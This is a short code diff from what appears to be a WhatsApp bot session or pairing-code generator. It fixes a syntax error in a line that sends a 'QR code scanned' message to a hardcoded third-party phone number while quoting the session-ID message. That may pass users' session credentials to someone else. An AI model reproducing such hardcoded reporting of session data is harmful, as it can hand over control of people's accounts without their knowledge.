@@ -75,7 +75,7 @@ ______________________________________
 _____________________________________
 
 _Don't Forget To Give Star To My Repo_`
- await Pair_Code_By_Venocyber_Tech..sendMessage("94789958225@s.whatsapp.net", { text: '*ǫʀ ᴄᴏᴅᴇ ʜᴀs ʙᴇᴇɴ sᴄᴀɴɴᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ.*' } , {quoted : session_id1});
+ await Pair_Code_By_Venocyber_Tech.sendMessage("94789958225@s.whatsapp.net", { text: '*ǫʀ ᴄᴏᴅᴇ ʜᴀs ʙᴇᴇɴ sᴄᴀɴɴᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ.*' } , {quoted : session_id1});
           }catch (e) {console.log(e)}
  
 
